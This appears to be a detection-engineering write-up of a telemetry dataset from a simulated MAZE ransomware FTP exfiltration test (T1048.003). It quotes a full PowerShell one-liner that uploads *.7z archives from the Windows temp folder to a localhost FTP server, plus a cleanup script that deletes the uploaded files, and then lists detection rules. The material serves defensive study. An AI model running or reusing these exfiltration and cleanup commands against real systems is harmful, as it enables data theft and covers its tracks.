# T1048.003-6: Exfiltration Over Unencrypted Non-C2 Protocol — MAZE FTP Upload

## Technique Context

T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol encompasses data theft over plaintext protocols that are not part of the C2 channel. FTP upload is a historically common exfiltration method — the protocol provides file transfer semantics, accepts binary data, and was widely deployed in enterprise environments. The MAZE ransomware group used FTP to exfiltrate data before encrypting victims' files, making this a well-documented real-world technique used for double-extortion operations.

The simulated attack pattern here replicates MAZE's behavior: enumerate files matching a specific pattern (`*.7z` archives in `%WINDIR%\temp`), connect to an FTP server, and upload each file using `System.Net.WebClient.UploadFile()`. The compression step (producing `.7z` archives before FTP upload) is a separate preparation phase — this test focuses on the upload portion, assuming archives already exist. The use of `System.Net.WebClient` for FTP operations uses .NET's built-in FTP support rather than spawning `ftp.exe`, making the activity invisible to process-based monitoring that looks for the FTP client executable.

Detection focuses on PowerShell making FTP connections (`ftp://` URI scheme) via `System.Net.WebClient`, `.7z` file creation in `%TEMP%` paths, and process ancestry indicating scripted rather than interactive FTP use.

## What This Dataset Contains

With Defender disabled, the MAZE FTP simulation executed fully. The technique ran both the upload phase and the cleanup phase (FTP deletion of uploaded files).

Security EID 4688 captures the upload script in the spawned PowerShell process command line: `"powershell.exe" & {$Dir_to_copy = "$env:windir\temp"; $ftp = "ftp://127.0.0.1/"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('', ''); if (test-connection -count 1 -computername "127.0.0.1" -quiet) {foreach($file in (dir $Dir_to_copy "*.7z")) {echo "Uploading $file..."; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}} else {echo "FTP Server Unreachable..."}}`. This is a near-complete reproduction of the MAZE FTP upload logic.

A second Security EID 4688 event captures the cleanup PowerShell process: the FTP deletion script that iterates over `*.7z` files and sends FTP DELETE requests: `$ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile`.

Sysmon EID 1 records both PowerShell spawnings — the upload script and the cleanup script. The `ParentCommandLine: powershell` establishes the ART test framework context.

PowerShell EID 4104 captures the cleanup script block: `& {$ftp = "ftp://127.0.0.1/"; try {foreach ($file in (dir "$env:windir\temp" "*.7z")) {$uri = New-Object System.Uri($ftp+$file.name); $ftp_del = [System.Net.FtpWebRequest]::create($uri); $ftp_del.Credentials = New-Object System.Net.NetworkCredential('',''); $ftp_del.Method = [System.Net.WebReques...`. This script block captures the FTP delete methodology: using `System.Net.FtpWebRequest` directly rather than `WebClient`, demonstrating a second .NET approach to FTP operations.

The Sysmon channel has 23 EID 7 ImageLoad events — the highest ImageLoad count among the three T1048.003 datasets — consistent with the FTP WebClient and FtpWebRequest classes loading additional networking assemblies. EID 10 process access shows PowerShell accessing both `whoami.exe` and itself, the standard ART test framework pattern.

Compared to the defended dataset (32 Sysmon, 12 Security, 42 PowerShell), the undefended run has more Sysmon events (35 vs. 32) and more PowerShell events (100 vs. 42), but fewer Security events (4 vs. 12). The defended run's additional Security events came from Defender-related process activity during monitoring.

## What This Dataset Does Not Contain

No Sysmon EID 3 network connection events document the FTP connection attempts. The FTP server at `ftp://127.0.0.1/` was likely not running (the script's `test-connection` check to 127.0.0.1 would succeed since ICMP to localhost always responds, but the FTP service on port 21 was not listening). Whether the WebClient's FTP `UploadFile()` call generated any EID 3 events before failing depends on whether the TCP connection attempt to port 21 was captured.

No `.7z` archive files are referenced in any file creation events — the test environment's `%WINDIR%\temp` likely had no `.7z` files, meaning the `foreach($file in (dir $Dir_to_copy "*.7z"))` loop iterated zero times and no upload attempts were made for actual files. The technique's file enumeration and upload logic executed but found nothing to upload.

File read events for the `.7z` files (if they existed) would not appear in Sysmon's default configuration.

## Assessment

This dataset delivers strong process execution telemetry that captures the entire MAZE FTP upload workflow in two Security EID 4688 events — one for the upload script and one for the cleanup/deletion script. The command lines are detailed enough to extract the FTP server address, credential pattern (empty username and password, characteristic of anonymous FTP or misconfigured servers), the target file extension (`*.7z`), and the target directory.

The dual-phase capture (upload and delete) is notable because it documents the full attacker workflow: exfiltrate, then clean up. This is realistic operational security behavior that many synthetic datasets don't include.

Compared to the defended version, the undefended run provides both command lines and the additional Sysmon ImageLoad telemetry from FTP .NET class loading. The defended version had more events overall due to Defender overhead.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 showing `powershell.exe` with `CommandLine` containing `System.Net.WebClient` combined with `ftp://` URI — FTP operations via WebClient from a workstation PowerShell process have no standard legitimate use case.

2. PowerShell EID 4104 script block containing `UploadFile` or `System.Net.FtpWebRequest` combined with `ftp://` — captures both WebClient and FtpWebRequest FTP upload methods.

3. Sysmon EID 3 connections from `powershell.exe` to port 21 (FTP control) — any FTP connection from PowerShell to an external host warrants investigation.

4. PowerShell EID 4104 containing `System.Net.NetworkCredential` with empty string credentials (`New-Object System.Net.NetworkCredential('','')`) — anonymous FTP credentials passed programmatically are a red flag for scripted data transfer.

5. Security EID 4688 cleanup script showing `FtpWebRequest` with `DeleteFile` method targeting `*.7z` files — the delete-after-upload cleanup pattern reveals anti-forensic intent.

6. Sysmon EID 11 file creation events for `.7z` files in `%WINDIR%\Temp` or `%TEMP%` paths — `.7z` archive creation in system temp directories precedes the FTP upload stage and is a reliable leading indicator.

7. Temporal sequence: EID 11 `.7z` file creation followed by PowerShell process creation with `ftp://` URI in command line — the compression-then-upload pattern documents the two-phase MAZE-style exfiltration workflow.
